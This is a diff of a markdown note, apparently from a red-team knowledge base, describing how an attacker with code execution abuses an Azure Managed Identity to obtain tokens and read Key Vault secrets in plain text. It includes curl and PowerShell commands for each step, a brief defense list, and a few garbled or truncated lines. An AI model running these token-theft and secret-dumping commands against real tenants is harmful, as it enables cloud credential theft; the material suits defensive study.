@@ -41,6 +41,8 @@ From an offensive perspective, an attacker may attempt to compromise the Managed
 
 The business value of this procedure is that it allows for secure storage and management of sensitive information, reducing the risk of data breaches and ensuring compliance with regulations such as GDPR and HIPAA.
 
+ 
+
 ## Requirements
 
 To successfully execute this procedure, ensure the following prerequisites:
@@ -53,6 +55,8 @@ To successfully execute this procedure, ensure the following prerequisites:
 
 1. Proper permissions are granted to access Azure Key Vault and Azure Management APIs.
 
+ 
+
 ## Defense
 
 To enhance security and protect your Azure Key Vault and Azure resources, consider implementing the following defense measures:
@@ -62,6 +66,8 @@ To enhance security and protect your Azure Key Vault and Azure resources, consid
 1. Regularly review and audit access control settings and permissions for Key Vault and Azure resources.
 
 1. Monitor logs and enable diagnostic logging to detect and respond to any suspicious activities.
+
+ 
 
 ## Objectives
 
@@ -75,12 +81,18 @@ The primary objectives of this procedure are as follows:
 
 1. Retrieve specific secrets from the designated Key Vault.
 
+ 
+
 # Instructions
 
 *<u>Overv*iew</u>
 
+
+
 **Code**: [[# keyvault access token
 curl "$IDENTITY_ENDPOINT?r]]
+
+
 
 > This command demonstrates how to access an Azure Key Vault using Managed Identity. The command first retrieves access tokens for the Key Vault and Management APIs using the Identity Endpoint and Identity Header. Then, it connects to the Azure account using the Connect-AzAccount cmdlet and passes the access tokens and the Managed Identity Client ID. Finally, it queries the Key Vault and its secrets using the Get-AzKeyVault and Get-AzKeyVaultSecret cmdlets.
 
@@ -90,12 +102,18 @@ To access an Azure Key Vault using Managed Identity, follow these steps:
 
           **  1. Retrieve the access token for the Key Vault and Management APIs using the Identity Endpoint and Identity Header.**
 
+
+
 **Command** ([[Get Key Vault Access Token]]):
 
 ```bash
 curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
 curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
 ```
+
+
+
+
 
 **Command** ([[Connect to Azure]]):
 
@@ -107,6 +125,10 @@ PS> $keyvaulttoken = 'eyJ0..'
 PS Az> Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken
 ```
 
+
+
+
+
 **Command** ([[Query Key Vault]]):
 
 ```powershell
@@ -114,6 +136,10 @@ PS Az> Get-AzKeyVault
 PS Az> Get-AzKeyVaultSecret -VaultName ResearchKeyVault
 PS Az> Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
 ```
+
+
+
+ 
 
 ## Platforms
 
@@ -141,3 +167,5 @@ PS Az> Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainTex
 - [[Cloud - Azure]]
 - [[Key Vault]]
 - [[KeyVault Secrets]]
+
+
